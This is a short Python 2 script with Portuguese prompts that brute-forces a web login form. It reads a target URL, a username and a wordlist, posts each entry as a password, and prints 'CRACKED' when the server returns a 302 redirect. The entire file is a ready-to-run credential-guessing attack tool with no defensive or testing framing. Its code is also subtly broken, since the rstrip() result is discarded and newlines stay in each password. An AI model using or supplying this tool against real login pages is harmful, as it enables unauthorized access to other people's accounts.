#!/usr/bin/env python
# coding: utf-8

from colorama import init, Fore
import requests
init(autoreset=True)

url = raw_input('Digite a url para autenticação: ')
user = raw_input('Digite o usuario para teste: ')
word = raw_input('Digite o caminha para a Wordlist: ')
word_list = open(word, 'r').readlines()

for senhas in word_list:
    senhas.rstrip()
    payload = {'username': user, 'password': senhas}
    r = requests.post(url, data=payload, allow_redirects=True)
    if r.status_code == 302:
        print Fore.GREEN + "[+]CRACKED %s %s" % (user, senhas)
    else:
        print Fore.RED + "[-]FALHOU %s %s" % (user, senhas)
